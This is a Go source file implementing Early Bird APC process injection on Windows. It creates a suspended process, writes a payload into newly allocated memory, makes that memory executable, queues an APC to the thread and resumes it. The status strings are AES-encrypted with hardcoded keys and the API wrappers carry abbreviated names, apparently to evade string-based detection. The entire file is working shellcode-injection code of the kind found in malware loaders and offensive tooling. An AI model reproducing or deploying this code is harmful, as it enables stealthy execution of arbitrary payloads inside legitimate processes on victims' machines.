package main

import "os"
import "fmt"
import "syscall"
import "unsafe"


func EB_Inj(proc string, payload []byte) {
   // Check
   if (proc == ""){
      var program_needed_msg string = GetAESDecrypted_aux("pmRxtpSO0LaPHojuKoXuWWEr4ULNxaUuR1n47cVsB0bpgqBnuC1uDljWPLjXGItq", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(program_needed_msg);
      os.Exit(-1);
   }

   // CreateProcess
   var sI syscall.StartupInfo;
   var pI syscall.ProcessInformation;
   argv := syscall.StringToUTF16Ptr(proc);
   var err error = syscall.CreateProcess( nil, argv, nil, nil, false, 4, nil, nil, &sI, &pI);
   if (err != nil){
      var cp_err_msg string = GetAESDecrypted_aux("wQpBPWJfjyjwim/zEV2Kh+g8u9RKtVqHVZbXiLlVIng=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(cp_err_msg, "\t\t", err);
   }
   var pid_msg string = GetAESDecrypted_aux("py7a9AvfJoG/m+X0ntf20w==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(pid_msg, "\t\t\t", pI.ProcessId);
   var thread_id_msg string = GetAESDecrypted_aux("Q5e5maNDzBuINEpTUL5eNQ==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(thread_id_msg, "\t\t\t\t", pI.ThreadId);

   // VirtualAllocEx
   var assigned_address uintptr = VAEx(uintptr(pI.Process), 0, uintptr(len(payload)), 0x1000 | 0x2000, 0x04);
   if (assigned_address == 0){
      var vaex_err_msg string = GetAESDecrypted_aux("xsfMFPbyUHUHfPzpm9EWlrEkUk0cgIEPj6mKs/vkaXr6pe/XdjMIU5Jy+XlDBG2g", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(vaex_err_msg);
      os.Exit(-1);
   }
   var assigned_address_msg string = GetAESDecrypted_aux("tD2QO8vGhvASCEhp2bfR4uOMd7UVfobBHNNMLn6Kff4=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(assigned_address_msg, "\t\t\t", fmt.Sprintf("0x%x", assigned_address));
   
   // WriteProcessMemory
   var res uintptr = WPM(uintptr(pI.Process), assigned_address, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)));
   if (res == 0){
      var wpm_err_msg string = GetAESDecrypted_aux("9m7i5xgFtmGk8npUcyx7pdGI5c0JPe72Fh0iGjejzUsslgSgjmVYer0HebvKLYvj", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(wpm_err_msg);
      os.Exit(-1);
   }
   var wpm_msg string = GetAESDecrypted_aux("blovpSERXH0jTY59ppKpHfSYAxVuyAiOT8IeU8+oock=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(wpm_msg, "\t", res);

   // VirtualProtectEx
   var oldProtect uintptr = 0x04
   var vpe_res uintptr = VPE(uintptr(pI.Process), assigned_address, uintptr(len(payload)), 0x20, uintptr(unsafe.Pointer(&oldProtect)));
   var vpe_res_msg string = GetAESDecrypted_aux("m8C6wzbZsSzsWqUExkObEnYHfWqUFN1xM5s9dBlCZy8=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(vpe_res_msg, "\t\t", vpe_res);

   // QueueUserAPC
   var QUAPC_res uintptr = QUAPC(assigned_address, uintptr(pI.Thread), 0);
   var quapc_res_msg string = GetAESDecrypted_aux("rxoZmXN1y3KDiTd/Dma+Te3g/KtIy2ppcBpbZkmyn20=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(quapc_res_msg, "\t\t", QUAPC_res);

   // ResumeThread
   RT(uintptr(pI.Thread));
   
   // CloseHandle
   CH(uintptr(pI.Process))
   CH(uintptr(pI.Thread))
}